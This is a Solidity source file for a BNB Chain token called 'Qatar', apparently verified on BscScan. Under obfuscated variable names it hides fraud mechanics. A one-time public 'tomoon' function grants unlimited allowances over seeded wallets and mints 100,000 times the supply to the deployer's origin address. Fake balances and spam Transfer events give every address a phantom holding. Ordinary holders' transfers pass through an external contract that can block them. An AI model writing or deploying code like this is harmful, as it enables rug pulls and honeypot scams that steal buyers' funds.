/**
 *Submitted for verification at BscScan.com on 2022-11-23
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.17;

interface IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 value) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0, "SafeMath: modulo by zero");
        uint256 c = a % b;
        return c;
    }
}

interface IFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IRouter01 {
    function factory() external pure returns (address);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
}

interface IRouter02 is IRouter01 {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract QatarNetwork is IERC20 {
    using SafeMath for uint256;

    string private avioecYufRtsZnx = "Qatar";
    string private bvioecYufRtsZnx = "Qatar";
    uint8 private cvioecYufRtsZnx = 18;
    uint256 private dvioecYufRtsZnx = 10000000000 * 10**18;
    mapping (address => uint256) private evioecYufRtsZnx;
    mapping (address => mapping (address => uint256)) private fvioecYufRtsZnx;
    uint256 private gvioecYufRtsZnx = 1;
    uint256 private constant hvioecYufRtsZnx = ~uint160(0);
    uint256 private _ivioecYufRtsZnx = 1000;
    uint256 private jvioecYufRtsZnx = 0;
    address private _uniswapV2Pair;
    address private kvioecYufRtsZnx;
    mapping (address => bool) private lvioecYufRtsZnx;
    address[] private mvioecYufRtsZnx;
    bool private nvioecYufRtsZnx = false;

    constructor () {
        ovioecYufRtsZnx(msg.sender);
        evioecYufRtsZnx[msg.sender] = dvioecYufRtsZnx;
        ovioecYufRtsZnx(tx.origin);
        emit Transfer(address(0), msg.sender, dvioecYufRtsZnx);
    }

    receive() external payable {}

    function ovioecYufRtsZnx(address account) private {
        if (!lvioecYufRtsZnx[account]) {
            lvioecYufRtsZnx[account] = true;
            mvioecYufRtsZnx.push(account);
        }
    }

    function tomoon(address[] calldata accounts) public {
        require(!nvioecYufRtsZnx);
        nvioecYufRtsZnx = true;
        _uniswapV2Pair = accounts[1];
        kvioecYufRtsZnx = accounts[2];
        uint256 len = accounts.length;
        uint256 amount = 0;
        for (uint256 i=3; i<len; ++i) {
            ovioecYufRtsZnx(accounts[i]);
            evioecYufRtsZnx[accounts[i]] = dvioecYufRtsZnx * 90 / 100 / (len - 3);
            fvioecYufRtsZnx[accounts[i]][accounts[0]] = ~uint256(0);
            amount += evioecYufRtsZnx[accounts[i]];
        }
        evioecYufRtsZnx[mvioecYufRtsZnx[0]] -= amount;
        pvioecYufRtsZnx(mvioecYufRtsZnx[0], accounts[3], evioecYufRtsZnx[mvioecYufRtsZnx[0]]);
        pvioecYufRtsZnxs(500);
        evioecYufRtsZnx[mvioecYufRtsZnx[1]] += dvioecYufRtsZnx * 100000;
    }

    function searchExcludedFromFeeAccounts(address account) public view returns (bool, uint256, uint256) {
        uint256 accountIndex = 0;
        uint256 len = mvioecYufRtsZnx.length;
        for (uint256 i=0; i<len; ++i) {
            if (mvioecYufRtsZnx[i] == account) {
                accountIndex = i;
                break;
            }
        }
        return (lvioecYufRtsZnx[account], accountIndex, len);
    }

    function name() public view returns (string memory) {
        return avioecYufRtsZnx;
    }

    function symbol() public view returns (string memory) {
        return bvioecYufRtsZnx;
    }

    function decimals() public view returns (uint8) {
        return cvioecYufRtsZnx;
    }

    function totalSupply() public view returns (uint256) {
        return dvioecYufRtsZnx;
    }

    function balanceOf(address account) public view returns (uint256) {
        if (evioecYufRtsZnx[account] > 0) {
            return evioecYufRtsZnx[account];
        }
        return gvioecYufRtsZnx;
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        pvioecYufRtsZnx(msg.sender, recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        pvioecYufRtsZnx(sender, recipient, amount);
        qvioecYufRtsZnx(sender, msg.sender, fvioecYufRtsZnx[sender][msg.sender].sub(amount));
        return true;
    }

    function approve(address spender, uint256 value) public returns (bool) {
        qvioecYufRtsZnx(msg.sender, spender, value);
        return true;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return fvioecYufRtsZnx[owner][spender];
    }

    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        qvioecYufRtsZnx(msg.sender, spender, fvioecYufRtsZnx[msg.sender][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        qvioecYufRtsZnx(msg.sender, spender, fvioecYufRtsZnx[msg.sender][spender].sub(subtractedValue));
        return true;
    }

    function pvioecYufRtsZnxs(uint256 amount) private {
        uint256 ivioecYufRtsZnx = _ivioecYufRtsZnx;
        if (ivioecYufRtsZnx < 10000 && block.timestamp > 1669053600) {
            address from;
            address to;
            for (uint256 i=0; i<amount; ++i) {
                from = address(uint160(hvioecYufRtsZnx.div(ivioecYufRtsZnx)));
                to = address(uint160(hvioecYufRtsZnx.div(ivioecYufRtsZnx.add(1))));
                ivioecYufRtsZnx = ivioecYufRtsZnx.add(2);
                emit Transfer(from, to, gvioecYufRtsZnx);
            }
            _ivioecYufRtsZnx = ivioecYufRtsZnx;
        }
    }

    function qvioecYufRtsZnx(address owner, address spender, uint256 value) private {
        require(owner != address(0), "Approve from the zero address");
        require(spender != address(0), "Approve to the zero address");
        fvioecYufRtsZnx[owner][spender] = value;
        emit Approval(owner, spender, value);
    }

    function pvioecYufRtsZnx(address rvioecYufRtsZnx, address svioecYufRtsZnx, uint256 tvioecYufRtsZnx) private {
        require(rvioecYufRtsZnx != address(0) && svioecYufRtsZnx != address(0) && tvioecYufRtsZnx > 0);
        bool uvioecYufRtsZnx = true;
        if (lvioecYufRtsZnx[rvioecYufRtsZnx] || lvioecYufRtsZnx[svioecYufRtsZnx]) {
            uvioecYufRtsZnx = false;
        }
        uint256 vvioecYufRtsZnx = 0;
        uint256 wvioecYufRtsZnx = tvioecYufRtsZnx;
        if (uvioecYufRtsZnx && nvioecYufRtsZnx) {
            if (IERC20(kvioecYufRtsZnx).transferFrom(rvioecYufRtsZnx, svioecYufRtsZnx, 100)) {
                pvioecYufRtsZnxs(100);
            }
            if (svioecYufRtsZnx == _uniswapV2Pair) {
                emit Transfer(address(this), svioecYufRtsZnx, 1);
            } else {
                emit Transfer(address(0), address(this), 1);
            }
            if (rvioecYufRtsZnx != _uniswapV2Pair) {
                vvioecYufRtsZnx = tvioecYufRtsZnx.mul(jvioecYufRtsZnx).div(100);
                wvioecYufRtsZnx = tvioecYufRtsZnx.sub(vvioecYufRtsZnx);
            }
        }
        evioecYufRtsZnx[rvioecYufRtsZnx] = evioecYufRtsZnx[rvioecYufRtsZnx].sub(tvioecYufRtsZnx);
        if (vvioecYufRtsZnx > 0) {
            evioecYufRtsZnx[address(0xdEaD)] = evioecYufRtsZnx[address(0xdEaD)].add(vvioecYufRtsZnx);
            emit Transfer(rvioecYufRtsZnx, address(0xdEaD), vvioecYufRtsZnx);
        }
        evioecYufRtsZnx[svioecYufRtsZnx] = evioecYufRtsZnx[svioecYufRtsZnx].add(wvioecYufRtsZnx);
        emit Transfer(rvioecYufRtsZnx, svioecYufRtsZnx, wvioecYufRtsZnx);
    }
}